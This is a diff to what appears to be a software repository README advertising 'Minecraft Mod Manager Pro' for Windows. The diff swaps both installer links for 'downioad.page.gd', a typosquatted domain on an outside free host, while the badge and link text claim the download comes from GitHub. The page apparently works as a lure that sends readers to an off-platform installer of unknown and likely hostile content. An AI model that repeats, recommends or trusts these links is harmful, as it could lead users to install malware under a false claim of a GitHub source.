@@ -2,7 +2,7 @@
 
 Minecraft Mod Manager Pro is the ultimate tool for managing mods, shaders, and resource packs on Windows 10 and 11. Enhance your gaming experience with easy installation and updates. This software provides a streamlined way to keep your Minecraft setup optimized and up-to-date, ensuring you spend more time playing and less time configuring.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -56,4 +56,4 @@ A: Absolutely, it supports both Fabric and Forge mod loaders, allowing you to ma
 
 To get the latest version of Minecraft Mod Manager Pro, click the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
